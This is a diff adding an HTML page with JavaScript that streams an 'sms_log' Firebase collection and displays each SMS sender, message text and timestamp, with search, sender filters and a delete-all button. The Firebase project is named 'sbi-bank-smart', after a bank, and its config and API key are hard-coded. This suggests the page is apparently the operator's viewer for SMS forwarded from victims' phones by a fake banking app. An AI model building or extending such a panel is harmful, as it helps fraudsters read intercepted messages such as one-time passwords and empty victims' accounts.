@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>SMS Log — Live</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, "Segoe UI", Roboto, sans-serif; }
+  body { background: #0f172a; color: #e2e8f0; min-height: 100vh; padding: 16px; }
+  .app { max-width: 720px; margin: 0 auto; }
+
+  .topbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
+  .topbar h1 { font-size: 1.3rem; }
+  .status { font-size: 0.75rem; padding: 4px 10px; border-radius: 999px; font-weight: 600; }
+  .status.online { background: #16a34a33; color: #4ade80; }
+  .status.offline { background: #dc262633; color: #f87171; }
+
+  .toolbar { display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap; }
+  .toolbar input, .toolbar select, .toolbar button {
+    background: #1e293b; border: 1px solid #334155; color: #e2e8f0;
+    padding: 10px 12px; border-radius: 10px; font-size: 0.9rem; outline: none;
+  }
+  .toolbar input { flex: 1; min-width: 180px; }
+  .toolbar input:focus, .toolbar select:focus { border-color: #6366f1; }
+  .toolbar button { cursor: pointer; transition: background 0.2s; }
+  .toolbar button:hover { background: #334155; }
+
+  .list { display: flex; flex-direction: column; gap: 12px; }
+  .empty { text-align: center; color: #64748b; padding: 40px 0; }
+
+  .card {
+    background: #1e293b; border: 1px solid #334155; border-radius: 14px;
+    padding: 14px 16px; position: relative; animation: slideIn 0.35s ease;
+  }
+  @keyframes slideIn {
+    from { opacity: 0; transform: translateY(-12px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  .card.new { border-color: #6366f1; box-shadow: 0 0 0 2px #6366f133; }
+
+  .card-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; gap: 8px; flex-wrap: wrap; }
+  .sender { font-weight: 700; font-size: 0.9rem; color: #818cf8; letter-spacing: 0.3px; }
+  .time { font-size: 0.72rem; color: #64748b; white-space: nowrap; }
+  .message { font-size: 0.92rem; line-height: 1.5; color: #cbd5e1; word-wrap: break-word; white-space: pre-wrap; }
+
+  .tags { display: flex; gap: 6px; margin-top: 10px; flex-wrap: wrap; }
+  .tag { font-size: 0.7rem; padding: 3px 8px; border-radius: 6px; background: #334155; color: #94a3b8; text-decoration: none; }
+  .tag.alert { background: #dc262633; color: #f87171; }
+  .tag.data  { background: #2563eb33; color: #60a5fa; }
+  .tag.power { background: #eab30833; color: #facc15; }
+</style>
+</head>
+<body>
+<div class="app">
+  <header class="topbar">
+    <h1>📩 SMS Log</h1>
+    <span id="status" class="status offline">Connecting…</span>
+  </header>
+
+  <div class="toolbar">
+    <input id="search" type="text" placeholder="Search sender or message…" />
+    <select id="filter">
+      <option value="all">All</option>
+      <option value="JIO">Jio</option>
+      <option value="APSPDC">APSPDC</option>
+    </select>
+    <button id="clearBtn" title="Clear all (demo only)">🗑️</button>
+  </div>
+
+  <main id="list" class="list">
+    <p class="empty">Loading messages…</p>
+  </main>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import {
+  getDatabase, ref, query, orderByChild, onValue, remove
+} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+/* ---------------- Firebase ---------------- */
+const firebaseConfig = {
+  apiKey: "AIzaSyDOCAxkrREX1uWDU7Q765_YnXCptAsT_x4",
+  authDomain: "sbi-bank-smart.firebaseapp.com",
+  databaseURL: "https://sbi-bank-smart-default-rtdb.firebaseio.com",
+  projectId: "sbi-bank-smart",
+  storageBucket: "sbi-bank-smart.firebasestorage.app",
+  messagingSenderId: "47138803332",
+  appId: "1:47138803332:web:5cf924f6473772fab7fcd1",
+};
+const app = initializeApp(firebaseConfig);
+const db  = getDatabase(app);
+const SMS_REF = "sms_log";
+
+/* ---------------- State ---------------- */
+let allMessages = [];
+let searchText = "";
+let filterSender = "all";
+const seenIds = new Set();
+
+/* ---------------- DOM ---------------- */
+const listEl   = document.getElementById("list");
+const statusEl = document.getElementById("status");
+const searchEl = document.getElementById("search");
+const filterEl = document.getElementById("filter");
+const clearBtn = document.getElementById("clearBtn");
+
+/* ============================================================
+   NORMALIZER — kisi bhi shape ka data + timestamp auto
+   ============================================================ */
+function normalizeSms(id, raw) {
+  let from = "", message = "", timestamp = 0;
+
+  if (typeof raw === "string") {
+    const p = parseFromString(raw);
+    from = p.from;
+    message = p.message;
+  } else if (raw && typeof raw === "object") {
+    from = raw.from ?? raw.sender ?? raw.address ?? raw.number ??
+           raw.originator ?? raw.src ?? "";
+    message = raw.message ?? raw.body ?? raw.msg ?? raw.text ??
+              raw.content ?? raw.sms ?? "";
+    timestamp = raw.timestamp ?? raw.time ?? raw.date ?? raw.ts ??
+                raw.receivedAt ?? 0;
+    from = String(from || "");
+    message = String(message || "");
+    timestamp = Number(timestamp) || 0;
+  } else {
+    message = JSON.stringify(raw ?? "");
+  }
+
+  // 🔑 Timestamp nahi hai to message text se nikaalo
+  if (!timestamp) {
+    timestamp = extractTimestampFromText(message);
+  }
+  // Ab bhi nahi mila to id se nikaalo (Firebase push id contains time)
+  if (!timestamp) {
+    timestamp = extractTimestampFromPushId(id);
+  }
+  // Ab bhi nahi to index-based fallback
+  if (!timestamp) {
+    timestamp = 1; // sabse purana
+  }
+
+  return { id, from, message, timestamp };
+}
+
+/* "From: XXX | Message: YYY" parse */
+function parseFromString(str) {
+  let from = "";
+  let message = String(str || "");
+
+  const m1 = message.match(/^\s*From:\s*([^|]+?)\s*\|\s*Message:\s*([\s\S]*)$/i);
+  if (m1) return { from: m1[1].trim(), message: m1[2].trim() };
+
+  const m2 = message.match(/^\s*([A-Z0-9\-_]{3,30})\s*:\s*([\s\S]*)$/);
+  if (m2) return { from: m2[1].trim(), message: m2[2].trim() };
+
+  return { from, message };
+}
+
+/* Message ke andar se date nikaalo: "12-Oct-26 21:49", "13-10-2026 07:17" */
+function extractTimestampFromText(msg) {
+  if (!msg) return 0;
+
+  // Pattern: 12-Oct-26 21:49
+  const m1 = msg.match(/(\d{1,2})-([A-Za-z]{3})-(\d{2,4})\s+(\d{1,2}):(\d{2})/);
+  if (m1) {
+    const months = { jan:0,feb:1,mar:2,apr:3,may:4,jun:5,jul:6,aug:7,sep:8,oct:9,nov:10,dec:11 };
+    const mm = months[m1[2].toLowerCase()];
+    if (mm !== undefined) {
+      let yy = +m1[3]; if (yy < 100) yy += 2000;
+      return new Date(yy, mm, +m1[1], +m1[4], +m1[5]).getTime();
+    }
+  }
+
+  // Pattern: 13-10-2026 07:17 (DD-MM-YYYY)
+  const m2 = msg.match(/(\d{1,2})-(\d{1,2})-(\d{4})\s+(\d{1,2}):(\d{2})/);
+  if (m2) {
+    return new Date(+m2[3], +m2[2]-1, +m2[1], +m2[4], +m2[5]).getTime();
+  }
+
+  return 0;
+}
+
+/* Firebase push id se approximate time nikaalo
+   Firebase push IDs start with timestamp chars (base64-ish) */
+function extractTimestampFromPushId(id) {
+  if (!id || id.length < 8) return 0;
+  const PUSH_CHARS = "-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz";
+  let ts = 0;
+  for (let i = 0; i < 8; i++) {
+    const c = PUSH_CHARS.indexOf(id[i]);
+    if (c === -1) return 0;
+    ts = ts * 64 + c;
+  }
+  // Sanity check: 2010 se 2100 ke beech
+  if (ts > 1262304000000 && ts < 4102444800000) return ts;
+  return 0;
+}
+
+/* ============================================================
+   LIVE LISTENER
+   ============================================================ */
+const q = query(ref(db, SMS_REF), orderByChild("timestamp"));
+
+onValue(q, (snapshot) => {
+  const arr = [];
+  snapshot.forEach((child) => {
+    arr.push(normalizeSms(child.key, child.val()));
+  });
+
+  // 🔑 NEWEST FIRST — naya sabse upar
+  arr.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+
+  arr.forEach((m) => {
+    if (!seenIds.has(m.id)) {
+      m._isNew = seenIds.size > 0;
+      seenIds.add(m.id);
+    }
+  });
+
+  allMessages = arr;
+  statusEl.textContent = "Live";
+  statusEl.className = "status online";
+  render();
+}, (error) => {
+  console.error("Firebase error:", error);
+  statusEl.textContent = "Offline";
+  statusEl.className = "status offline";
+  listEl.innerHTML = `<p class="empty">Error: ${escapeHTML(error.message)}</p>`;
+});
+
+/* ============================================================
+   RENDER
+   ============================================================ */
+function render() {
+  let items = allMessages;
+
+  if (filterSender !== "all") {
+    items = items.filter((m) =>
+      (m.from || "").toUpperCase().includes(filterSender.toUpperCase())
+    );
+  }
+
+  if (searchText.trim()) {
+    const s = searchText.toLowerCase();
+    items = items.filter((m) =>
+      (m.from || "").toLowerCase().includes(s) ||
+      (m.message || "").toLowerCase().includes(s)
+    );
+  }
+
+  if (!items.length) {
+    listEl.innerHTML = `<p class="empty">No messages found.</p>`;
+    return;
+  }
+
+  listEl.innerHTML = items.map(cardHTML).join("");
+
+  items.forEach((m) => {
+    if (m._isNew) {
+      const el = document.querySelector(`[data-id="${m.id}"]`);
+      if (el) {
+        el.classList.add("new");
+        setTimeout(() => el.classList.remove("new"), 2500);
+        m._isNew = false;
+      }
+    }
+  });
+}
+
+function cardHTML(m) {
+  const from = escapeHTML(m.from || "UNKNOWN");
+  const msg  = escapeHTML(m.message || "");
+  const time = m.timestamp > 1 ? formatTime(m.timestamp) : "—";
+
+  return `
+    <article class="card" data-id="${m.id}">
+      <div class="card-head">
+        <span class="sender">${from}</span>
+        <span class="time">${time}</span>
+      </div>
+      <div class="message">${msg}</div>
+      <div class="tags">
+        ${msg.toLowerCase().includes("alert") ? '<span class="tag alert">Alert</span>' : ""}
+        ${msg.toLowerCase().includes("data")  ? '<span class="tag data">Data</span>'  : ""}
+        ${(msg.includes("విద్యుత్") || msg.toLowerCase().includes("power")) ? '<span class="tag power">Power</span>' : ""}
+      </div>
+    </article>
+  `;
+}
+
+/* ============================================================
+   HELPERS
+   ============================================================ */
+function formatTime(ts) {
+  return new Date(ts).toLocaleString("en-IN", {
+    day: "2-digit", month: "short", year: "2-digit",
+    hour: "2-digit", minute: "2-digit",
+  });
+}
+
+function escapeHTML(str) {
+  return String(str)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#039;");
+}
+
+/* ============================================================
+   EVENTS
+   ============================================================ */
+searchEl.addEventListener("input", (e) => { searchText = e.target.value; render(); });
+filterEl.addEventListener("change", (e) => { filterSender = e.target.value; render(); });
+
+clearBtn.addEventListener("click", async () => {
+  if (!confirm("Delete ALL messages? Cannot be undone.")) return;
+  try {
+    await remove(ref(db, SMS_REF));
+    seenIds.clear();
+  } catch (err) {
+    alert("Error: " + err.message);
+  }
+});
+</script>
+</body>
+</html>
